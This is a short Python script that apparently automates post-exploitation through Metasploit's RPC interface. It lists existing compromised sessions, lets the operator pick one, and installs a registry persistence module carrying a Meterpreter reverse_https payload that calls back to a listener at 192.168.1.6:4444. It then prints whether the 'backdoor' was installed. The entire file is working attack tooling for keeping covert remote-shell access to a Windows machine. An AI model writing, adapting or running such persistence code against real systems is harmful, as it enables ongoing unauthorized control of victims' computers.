from time import sleep 
from library.pymetasploit3.msfrpc import MsfRpcClient

def init(client,sid):
    fail=''
    output = ''
    persistence = client.modules.use('exploit','windows/local/registry_persistence')
    persistence['SESSION'] = int(sid)
    httpspl = client.modules.use('payload','windows/meterpreter/reverse_https')
    httpspl['LHOST'] = '192.168.1.6'
    httpspl['LPORT'] = '4444'
    print("[*] Installing registry payload...")
    cid = client.consoles.console().cid
    print(cid)
    output = (client.consoles.console(cid).run_module_with_output(persistence, payload=httpspl).split('['))
    #print(output)
    #print(len(output))
    x=1
    while x < len(output): 
        #print(output[x])
        if "Failed:" in output[x]:
            snippet=output[x]
            #print(snippet)
            fail = snippet.split('Failed: ')
        x+=1
    if(len(fail)>1):
        output = "[*] Failed to install backdoor!"
    else:
        output = "[*] Backdoor successfully installed!"
    print(output)
    return(output)


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    print("Select sessions to proceed: \n")
    if len(client.sessions.list.items())<1 :
        print("There are no sessions available")
        exit()
    for id,c in client.sessions.list.items():
        print("{})".format(id),"IP: {}".format(c.get('session_host')),"| {}".format(c.get('desc')),"{}".format(c.get('arch')))
    #print("---------------------------------")
    sid = input()
    #print("--------------------------------- \n")
    init(client,sid)